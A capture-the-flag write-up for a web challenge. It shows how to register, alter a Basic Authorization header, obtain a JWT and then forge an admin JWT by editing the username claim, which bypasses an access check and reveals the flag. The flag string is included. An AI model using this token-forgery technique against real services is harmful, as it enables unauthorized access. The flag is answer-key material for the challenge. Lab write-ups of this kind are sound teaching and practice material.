1. When you visit website, it will ask you to register with username and password as param
2. Register using `GET /register?username=test&password=test`
3. Then in the `/` main route, there is `Authorization` in header which is base64 encoded string of `admin:admin`. Change that string to our username and password that is `test:test` and then encode it. Then add that `Authorization` header: `Authorization: Basic dGVzdDp0ZXN0`
4. You will get JWT token and `Info: check /info` in header, which is our next clue
5. Send get request to `/info`, it will send this as response `check the /validate route; use token as the query param`
6. Use your jwt token as param, like this `GET /validate?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE2ODA5ODA3NDJ9.tPGy3BDAQPxod81IrzAscD6TlPSRGU1WCIxJlfJx6qo`. You will see `only the admin account has permissions to access the flag` in the response
7. That means, we have to change the token to admin using jwt.io. Change username to `admin` and add that changed token to request. `GET /validate?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjgwOTgwNzQyfQ.g98kZbP1wal_VjEcs-4PH0FaxK8iZj_Mu6iQF8zd5LE`
8. And boom, we will get our flag.

Flag: `bucket{1_l0v3_jwt!!!1!!!!1!!!!!1111!}`
